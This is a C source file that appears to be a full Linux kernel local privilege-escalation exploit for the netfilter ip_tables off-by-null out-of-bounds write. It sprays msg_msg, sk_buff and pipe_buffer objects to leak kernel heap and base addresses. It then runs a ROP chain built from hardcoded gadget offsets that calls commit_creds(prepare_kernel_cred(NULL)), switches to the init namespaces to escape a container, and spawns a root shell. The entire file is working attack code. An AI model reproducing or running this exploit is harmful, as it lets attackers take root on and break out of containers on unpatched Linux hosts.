#include "./helpful.h"

#define NUM_MSQIDS 4096
#define SKB_SHARED_INFO_SIZE 0x140
#define PRIMARY_SIZE 0x1000
#define SECONDARY_SIZE 0x400
#define MTYPE_PRIMARY 0x41
#define MTYPE_SECONDARY 0x42
#define MSG_TAG 0xAAAAAAAA
#define ANON_PIPE_BUF_OPS 0x123e140 
// clang-format off
#define PUSH_RSI_JMP_QWORD_PTR_RSI_39 0x72e1ac                      // 0xffffffff8172e1ac: push rsi; jmp qword ptr [rsi + 0x39];
#define POP_RSP_RET 0x163ea0                                        // 0xffffffff81163ea0: pop rsp; ret; 
#define ADD_RSP_D0_RET 0x6f8c9                                      // 0xffffffff8106f8c9: add rsp, 0xd0; ret; 

#define ENTER_0_0_POP_RBX_POP_R12_POP_RBP_RET 0xea95d               // 0xffffffff810ea95d : enter 0, 0 ; pop rbx ; pop r12 ; pop rbp ; ret              only ROPgadget can find
#define MOV_QWORD_PTR_R12_RBX_POP_RBX_POP_R12_POP_RBP_RET 0x4cebe7  // 0xffffffff814cebe7: mov qword ptr [r12], rbx; pop rbx; pop r12; pop r13; pop rbp; ret;
#define PUSH_QWORD_PTR_RBP_A_POP_RBP_RET 0x6ed6ef                   // 0xffffffff816ed6ef: push qword ptr [rbp + 0xa]; pop rbp; ret; 
#define MOV_RSP_RBP_POP_RBP_RET 0x8c5bc                             // 0xffffffff8108c5bc: mov rsp, rbp; pop rbp; ret;

#define POP_RCX_RET 0x5e5c73                                        // 0xffffffff81439b92: pop rcx; ret;          \x59\xc3     fault when debug, cannot use   $ objdump -d ./vmlinux_small -M intel | grep  "59 c3"  -> ffffffff815e5c72:	e8 59 c3 fe ff       	call   0xffffffff815d1fd0
#define POP_RSI_RET 0xb105e                                         // 0xffffffff810b105e: pop rsi; ret;
#define POP_RDI_RET 0x8c650                                         // 0xffffffff8108c650: pop rdi; ret;
#define POP_RBP_RET 0x69e                                           // 0xffffffff8100069e: pop rbp; ret;

#define MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET 0x588d54                    // 0xffffffff81588d54: mov rdi, rax; jne 0x788d41; xor eax, eax; ret;
#define CMP_RCX_4_JNE_POP_RBP_RET 0x7459b                           // 0xffffffff8107459b: cmp rcx, 4; jne 0x274579; pop rbp; ret; 

#define FIND_TASK_BY_VPID 0xc0a40           // ffffffff810c0a40 T find_task_by_vpid
#define SWITCH_TASK_NAMESPACES 0xc8ad0      // ffffffff810c8ad0 T switch_task_namespaces
#define COMMIT_CREDS 0xc9f00                // ffffffff810c9f00 T commit_creds
#define PREPARE_KERNEL_CRED 0xca3e0         // ffffffff810ca3e0 T prepare_kernel_cred

#define ANON_PIPE_BUF_OPS 0x123e140         // ffffffff8223e140 r anon_pipe_buf_ops
#define INIT_NSPROXY 0x186b540              // ffffffff8286b540 D init_nsproxy
typedef struct  {
    long mtype;
    char mtext[PRIMARY_SIZE - sizeof(struct msg_msg)];
}p_Msg;

typedef struct  {
    long mtype;
    char mtext[SECONDARY_SIZE - sizeof(struct msg_msg)];
}s_Msg;

typedef struct  {
    long mtype;
    char mtext[PAGE_SIZE - sizeof(struct msg_msg)  + PAGE_SIZE - sizeof(struct msg_msgseg)];
}fake_Msg;



int trigger_oob_write(int s) {
  struct __attribute__((__packed__)) {
    struct ipt_replace replace;                     // 0x60
    struct ipt_entry entry;                         // 0x70
    struct xt_entry_match match;                    // 0x20
    char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];           //  kvmalloc_size = sizeof(xt_table_info) + ipt_replace->size =  0x40 + (0xFB8 - 0x2) = 0xFF8 - 0x2
    struct xt_entry_target target;                  // 0x20
  } data = {0};

  data.replace.num_counters = 1;
  data.replace.num_entries = 1;
  data.replace.size = (sizeof(data.entry) + sizeof(data.match) +
                       sizeof(data.pad) + sizeof(data.target));             // 0x70 + (0x108+0x1000-0x200-0x2) + 0x20 + 0x20 = 0xFB8 - 0x2

  data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) +
                            sizeof(data.pad) + sizeof(data.target));        // Size of ipt_entry + matches + target
  data.entry.target_offset =
      (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad));         // Size of ipt_entry + matches

  data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad));   // 0x20 + (0x108+0x1000-0x200-0x2) = 0xF28 - 0x2
  strcpy(data.match.u.user.name, "icmp");
  data.match.u.user.revision = 0;

  data.target.u.user.target_size = sizeof(data.target);                     // 0x20
  strcpy(data.target.u.user.name, "NFQUEUE");
  data.target.u.user.revision = 1;

  // Partially overwrite the adjacent buffer with 2 bytes of zero.
  if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)) != 0) {
    if (errno == ENOPROTOOPT) {
        
      printf("[-] Error ip_tables module is not loaded.\n");
      return -1;
    }
  }

  return 0;
}
// Note: Must not touch offset 0x10-0x18.
void build_krop(char *buf, uint64_t kbase_addr, uint64_t scratchpad_addr) {
  uint64_t *rop;
  *(uint64_t *)&buf[0x39] = kbase_addr + POP_RSP_RET;
  *(uint64_t *)&buf[0x00] = kbase_addr + ADD_RSP_D0_RET;

  rop = (uint64_t *)&buf[0xD8];

  // Save RBP at scratchpad_addr.
  *rop++ = kbase_addr + ENTER_0_0_POP_RBX_POP_R12_POP_RBP_RET;                  // enter 0, 0 ; pop rbx ; pop r12 ; pop rbp ; ret 
  *rop++ = scratchpad_addr; // R12
  *rop++ = 0xDEADBEEF;      // RBP
  *rop++ = kbase_addr + MOV_QWORD_PTR_R12_RBX_POP_RBX_POP_R12_POP_RBP_RET;      // mov qword ptr [r12], rbx; pop rbx; pop r12; pop r13; pop rbp; ret;
  *rop++ = 0xDEADBEEF; // RBX
  *rop++ = 0xDEADBEEF; // R12
  *rop++ = 0xDEADBEEF; // R13
  *rop++ = 0xDEADBEEF; // RBP

  // commit_creds(prepare_kernel_cred(NULL))
  *rop++ = kbase_addr + POP_RDI_RET;                                            // pop rdi; ret;
  *rop++ = 0; // RDI
  *rop++ = kbase_addr + PREPARE_KERNEL_CRED;
  *rop++ = kbase_addr + POP_RCX_RET;                                            // pop rcx; ret;
  *rop++ = 4; // RCX
  *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;                              // cmp rcx, 4; jne 0x274579; pop rbp; ret; 
  *rop++ = 0xDEADBEEF; // RBP
  *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;                        // mov rdi, rax; jne 0x788d41; xor eax, eax; ret;
  *rop++ = kbase_addr + COMMIT_CREDS;

  // switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)                 This step can be deleted. Not important.
  *rop++ = kbase_addr + POP_RDI_RET;                                            // pop rdi; ret;
  *rop++ = 1; // RDI
  *rop++ = kbase_addr + FIND_TASK_BY_VPID;                                      // find_task_by_vpid
  *rop++ = kbase_addr + POP_RCX_RET;                                            // pop rcx; ret;
  *rop++ = 4; // RCX
  *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;                              // cmp rcx, 4; jne 0x274579; pop rbp; ret; 
  *rop++ = 0xDEADBEEF; // RBP
  *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;                        // mov rdi, rax; jne 0x788d41; xor eax, eax; ret;
  *rop++ = kbase_addr + POP_RSI_RET;                                            // pop rsi; ret;
  *rop++ = kbase_addr + INIT_NSPROXY; // RSI                                    // init_nsproxy
  *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES;                                 // switch_task_namespaces

  // Load RBP from scratchpad_addr and resume execution.
  *rop++ = kbase_addr + POP_RBP_RET;                                            // pop rbp; ret;
  *rop++ = scratchpad_addr - 0xA; // RBP
  *rop++ = kbase_addr + PUSH_QWORD_PTR_RBP_A_POP_RBP_RET;                       // push qword ptr [rbp + 0xa]; pop rbp; ret;
  *rop++ = kbase_addr + MOV_RSP_RBP_POP_RBP_RET;                                // mov rsp, rbp; pop rbp; ret;
}
void prepare(){
    if (unshare(CLONE_NEWUSER) < 0) {
        perror("[-] unshare(CLONE_NEWUSER)");
        return -1;
    }
    if (unshare(CLONE_NEWNET) < 0) {
        perror("[-] unshare(CLONE_NEWNET)");
        return -1;
    }
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
        perror("[-] sched_setaffinity");
        return -1;
    }
}



void attack(){
    int s;
    int ss[NUM_SOCKETS][2];
    int msqid[NUM_MSQIDS];
    p_Msg p_msg;
    s_Msg s_msg;
    int p_idx = -1;
    int s_idx = -1;
    char primary_buf[PRIMARY_SIZE - SKB_SHARED_INFO_SIZE];
    char secondary_buf[0x400 - SKB_SHARED_INFO_SIZE];
    uint64_t kheap_addr;
    fake_Msg fake_msg;
    struct msg_msg *msg;
    uint64_t kbase_addr = 0;
    uint64_t pipe_buffer_ops = 0;
    struct pipe_buf_operations *ops;
    struct pipe_buffer *buf;
    assert((s = socket(AF_INET,SOCK_STREAM,0)) > 0);
    assert(initSocketArray(ss)  == 0);
    // spray msg_msg
    for(int i = 0;i < NUM_MSQIDS;i++){
        assert((msqid[i] = getMsgQueue()) >= 0);
    }
    for(int i = 0;i < NUM_MSQIDS;i++){
        *(int *)&p_msg.mtext[0] = MSG_TAG;
        *(int *)&p_msg.mtext[4] = i;
        assert(writeMsg(msqid[i],&p_msg,sizeof(p_msg),MTYPE_PRIMARY) >= 0);
    }
    for(int i = 0;i < NUM_MSQIDS;i++){
        *(int *)&s_msg.mtext[0] = MSG_TAG;
        *(int *)&s_msg.mtext[4] = i;
        assert(writeMsg(msqid[i],&s_msg,sizeof(s_msg),MTYPE_SECONDARY) >= 0);
    }
    // create hole
    for(int i = 0x400;i < NUM_MSQIDS;i += 0x400){
        assert((readMsg(msqid[i],&p_msg,sizeof(p_msg),MTYPE_PRIMARY)) > 0);
    }
    // off-by-null
    trigger_oob_write(s);
    // look up corruption msg
    for(int i = 0;i < NUM_MSQIDS;i++){
        if((i != 0) && ((i % 0x400) == 0))
            continue;
        assert(peekMsg(msqid[i],&s_msg,sizeof(s_msg),1) >= 0);
        if(*(int *)&s_msg.mtext[0] != MSG_TAG){
            assert(0);
        }
        if(*(int *)&s_msg.mtext[4] != i){
            p_idx = i;
            s_idx = *(int *)&s_msg.mtext[4];
            break;
        }
    }
    printf("[+] fake_idx,real_idx = 0x%x,0x%x\n",p_idx,s_idx);
    assert(p_idx != -1 && s_idx != -1);
    // free real 0x400 msg
    assert(readMsg(msqid[s_idx],&s_msg,sizeof(s_msg),MTYPE_SECONDARY) > 0);
    memset(secondary_buf,0,sizeof(secondary_buf));
    buildMsg((struct msg_msg *)secondary_buf,0x41414141,0x42424242,0x1337,PAGE_SIZE-sizeof(struct msg_msg),0);
    spraySkBuff(ss,secondary_buf,sizeof(secondary_buf));
    assert(peekMsg(msqid[p_idx],&fake_msg,sizeof(fake_msg),1) > 0);
    assert(*(int *)&fake_msg.mtext[SECONDARY_SIZE] == MSG_TAG);
    msg = (struct msg_msg *)&fake_msg.mtext[SECONDARY_SIZE - sizeof(struct msg_msg)];
    kheap_addr = msg->m_list_next;
    if(kheap_addr & (PRIMARY_SIZE - 1))
        kheap_addr = msg->m_list_prev;
    printf("[+] leak kheap = 0x%llx\n",kheap_addr);
    assert((kheap_addr & 0xFFFF000000000000) == 0xFFFF000000000000);
    freeSkBuff(ss,secondary_buf,sizeof(secondary_buf));
    memset(secondary_buf,0,sizeof(secondary_buf));
    buildMsg((struct msg_msg *)secondary_buf,0x41414141,0x42424242,0x1337,sizeof(fake_msg.mtext),kheap_addr - 0x8);
    spraySkBuff(ss,secondary_buf,sizeof(secondary_buf));
    assert(peekMsg(msqid[p_idx],&fake_msg,sizeof(fake_msg),1) > 0);
    assert(*(int *)&fake_msg.mtext[PAGE_SIZE] == MSG_TAG);
    msg = (struct msg_msg *)&fake_msg.mtext[PAGE_SIZE - sizeof(struct msg_msg)];
    kheap_addr = msg->m_list_next;
    if (kheap_addr & (SECONDARY_SIZE - 1))
        kheap_addr = msg->m_list_prev;
    kheap_addr -= SECONDARY_SIZE;
    printf("[+] uaf kheap = 0x%llx\n",kheap_addr);
    //leak kernel_base
    freeSkBuff(ss,secondary_buf,sizeof(secondary_buf));
    memset(secondary_buf,0,sizeof(secondary_buf));
    buildMsg((struct msg_msg *)secondary_buf,kheap_addr,kheap_addr,0x1337,0,0);
    spraySkBuff(ss,secondary_buf,sizeof(secondary_buf));

    // free msg_msg
    //getchar();

    assert(readMsg(msqid[p_idx],&fake_msg,sizeof(fake_msg),0x1337) >= 0);
    // spray pipe_buff
    sprayPipeBuff();
    for (int i = 0; i < NUM_SOCKETS; i++) {
        for (int j = 0; j < NUM_SKBUFFS; j++) {
        if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) < 0) {
            assert(0);
        }
        if (*(uint64_t *)&secondary_buf[0x10] != 0x1337)
            pipe_buffer_ops = *(uint64_t *)&secondary_buf[0x10];
        }
    }
    kbase_addr = pipe_buffer_ops - ANON_PIPE_BUF_OPS;
    printf("[+] kbase_addr: %llx\n", kbase_addr);
    memset(secondary_buf, 0, sizeof(secondary_buf));
    buf = (struct pipe_buffer *)&secondary_buf;
    buf->ops = kheap_addr + 0x290;
    ops = (struct pipe_buf_operations *)&secondary_buf[0x290];

    // RSI points to &buf.
    ops->release = kbase_addr + PUSH_RSI_JMP_QWORD_PTR_RSI_39; 
    build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0);
    spraySkBuff(ss,secondary_buf,sizeof(secondary_buf));
    closePipeBuff();
    printf("[*] get root! have fun!\n");
    system("/bin/sh");
}
void main(){
    prepare();
    attack();
}